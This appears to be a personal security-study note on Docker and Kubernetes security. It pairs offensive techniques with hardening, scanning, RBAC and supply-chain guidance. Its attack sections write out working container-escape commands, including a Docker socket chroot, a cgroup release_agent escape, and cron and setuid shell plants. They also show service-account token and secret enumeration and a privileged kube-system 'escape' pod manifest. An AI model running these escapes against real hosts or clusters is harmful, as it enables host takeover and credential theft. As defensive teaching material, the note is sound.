---
type: monograph
room: green
subject: "Container Security"
tags: [green/cloud, green/containers, green/docker, green/kubernetes]
date_updated: {{date}}
---

# Cloud — Container Security

> [!quote]
> *"When you have eliminated all which is impossible, then whatever remains, however improbable, must be the truth."*
> — A misconfigured container escape is improbable until it isn't.

**Reference:** CIS Docker Benchmark, CIS Kubernetes Benchmark, MITRE ATT&CK for Containers

Containers introduced new attack surfaces: image supply chain, runtime privilege escalation, host escape, and Kubernetes misconfigurations. This monograph covers attacking and defending both Docker and Kubernetes.

---

## Docker Security

### Finding Misconfigurations

```bash
# Check if running as root inside container
whoami; id

# Check if container is privileged
cat /proc/self/status | grep -i cap   # CapEff: 0000003fffffffff = full caps = privileged
# Or: docker inspect <container> | grep Privileged

# Check if Docker socket is mounted (GAME OVER)
ls -la /var/run/docker.sock
# If present → full host escape:
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh

# Check for dangerous capabilities
# CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_SYS_PTRACE = near-privileged
capsh --print | grep Current

# Check mounted host paths
cat /proc/mounts | grep -v "proc\|sys\|cgroup\|devpts"
# Look for: /host, /etc, /var — host filesystem mounts
```

### Container Escape Techniques

```bash
# 1. Privileged container escape — mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host    # find correct device from /proc/partitions
chroot /mnt/host bash        # full host shell

# 2. Docker socket escape (if docker.sock mounted)
docker -H unix:///var/run/docker.sock ps  # confirm access
docker -H unix:///var/run/docker.sock run -it --privileged \
  --net=host --pid=host -v /:/host ubuntu chroot /host

# 3. CAP_SYS_ADMIN escape via cgroup notification
# (notify_on_release + release_agent technique)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cp /bin/bash /host/bash && chmod 4777 /host/bash" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# Then: /host/bash -p  → root on host

# 4. nsenter — if host PID namespace accessible
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# 5. Writable hostPath volume
# If /etc/cron.d or /etc/init.d are mounted from host:
echo "* * * * * root cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash" > /etc/cron.d/escape
```

### Docker Hardening

```bash
# Run as non-root
docker run --user 1000:1000 image

# Drop all capabilities, add only needed
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE image

# Read-only filesystem
docker run --read-only image

# No privilege escalation
docker run --security-opt no-new-privileges image

# Limit resources
docker run --memory=512m --cpus=1.0 image

# Use seccomp profile
docker run --security-opt seccomp=/path/to/seccomp.json image

# Scan image for vulnerabilities
trivy image ubuntu:22.04
trivy image --severity HIGH,CRITICAL myapp:latest
```

**Dockerfile Best Practices:**
```dockerfile
# Use minimal base image
FROM gcr.io/distroless/python3-debian12

# Don't run as root
RUN addgroup --system app && adduser --system --group app
USER app

# Don't include secrets — use build args or secrets at runtime
# BAD:  ENV AWS_SECRET_KEY=abc123
# GOOD: Runtime secret injection via secret manager

# Use multi-stage builds — don't ship build tools
FROM golang:1.21 AS builder
RUN go build -o app .
FROM gcr.io/distroless/static
COPY --from=builder /app/app /app
```

---

## Kubernetes Security

### Enumeration (from inside a Pod)

```bash
# Check service account token and permissions
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
KUBE="https://kubernetes.default.svc"

# What can this pod do?
curl -sSk -H "Authorization: Bearer $TOKEN" \
  "$KUBE/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$NS"'"}}' \
  -H "Content-Type: application/json"

# List pods in namespace
curl -sSk -H "Authorization: Bearer $TOKEN" \
  "$KUBE/api/v1/namespaces/$NS/pods"

# List all namespaces (if cluster-admin or cluster-reader)
curl -sSk -H "Authorization: Bearer $TOKEN" "$KUBE/api/v1/namespaces"

# List secrets (if allowed)
curl -sSk -H "Authorization: Bearer $TOKEN" \
  "$KUBE/api/v1/namespaces/$NS/secrets"
```

### Kubernetes Privilege Escalation

```bash
# If pod can create pods → mount host filesystem
# Create privileged pod YAML
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape
  namespace: kube-system
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  containers:
  - name: escape
    image: ubuntu
    command: ["/bin/bash", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Exec into escape pod
kubectl exec -it escape -n kube-system -- /host/bin/bash -c "chroot /host"
```

### Common Kubernetes Misconfigurations

```bash
# Check for anonymous API server access
curl -sk https://<kube-api>:6443/api/v1/pods

# Check RBAC — cluster-admin bound to default ServiceAccount?
kubectl get clusterrolebindings -o wide | grep -E "cluster-admin|default"

# Check for privileged pods
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}'

# Check for pods with hostPath mounts
kubectl get pods -A -o yaml | grep -A2 "hostPath:"

# Check Network Policies (lack of = all traffic allowed)
kubectl get networkpolicies -A

# Check Pod Security Standards admission
kubectl get pods -A -o yaml | grep "securityContext"
```

### Kubernetes Hardening

```bash
# Apply Pod Security Standards (enforce restricted profile)
kubectl label namespace default pod-security.kubernetes.io/enforce=restricted

# Check with kube-bench (CIS Benchmark)
kube-bench run --targets node,master

# Check with kubescape
kubescape scan framework NSA
kubescape scan framework MITRE

# trivy misconfig scan
trivy k8s --report summary cluster
trivy k8s --report summary --severity HIGH,CRITICAL cluster
```

**RBAC Best Practices:**
```markdown
☐ No cluster-admin ClusterRoleBinding to default ServiceAccounts
☐ Namespace-scoped Roles over ClusterRoles where possible
☐ ServiceAccount tokens mounted only in pods that need them
  → spec.automountServiceAccountToken: false (default pod spec)
☐ No wildcard verbs (*) or resources (*) in Roles
☐ Audit RBAC quarterly — remove unused bindings
```

**Network Policy (default deny):**
```yaml
# Apply to every namespace
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
spec:
  podSelector: {}   # selects all pods
  policyTypes:
  - Ingress
  - Egress
  # No rules = deny everything
```

---

## Supply Chain — Image Security

```bash
# Scan image in registry before deployment
trivy image --severity CRITICAL,HIGH registry/myapp:1.0

# Check image for secrets
trufflehog docker --image registry/myapp:1.0

# Verify image signature (Sigstore/Cosign)
cosign verify registry/myapp:1.0 --certificate-identity=build@company.com \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com

# Sign image in CI pipeline
cosign sign --key cosign.key registry/myapp:1.0

# SBOM — generate software bill of materials
syft registry/myapp:1.0 -o spdx-json > sbom.json
grype sbom:sbom.json  # scan SBOM for vulns
```

---

## Related Notes

- [[Cloud - AWS Security]] ← ECS/EKS context
- [[Cloud - CI/CD Security]] ← Securing the build pipeline that creates images
- [[Green - Instruments]] ← Docker, kubectl, trivy, Prowler command cheat sheet

↩ [[Green - Monographs]] · [[Green]] · [[Mind Palace]]
